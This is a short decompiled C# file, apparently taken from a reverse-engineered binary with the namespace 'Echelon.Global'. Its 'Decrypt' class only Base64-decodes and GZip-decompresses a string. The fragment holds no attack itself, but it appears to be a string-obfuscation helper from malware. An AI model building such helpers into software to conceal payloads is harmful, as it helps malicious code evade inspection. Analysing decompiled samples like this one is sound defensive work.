using System;
using System.IO;
using Ionic.Zlib;

namespace Echelon.Global
{
	// Token: 0x02000043 RID: 67
	internal class Decrypt
	{
		// Token: 0x06000190 RID: 400 RVA: 0x0000C508 File Offset: 0x0000A708
		public static string Get(string str)
		{
			byte[] array = Convert.FromBase64String(str);
			string result = string.Empty;
			if (array != null && array.Length != 0)
			{
				using (MemoryStream memoryStream = new MemoryStream(array))
				{
					using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
					{
						using (StreamReader streamReader = new StreamReader(gzipStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}
	}
}
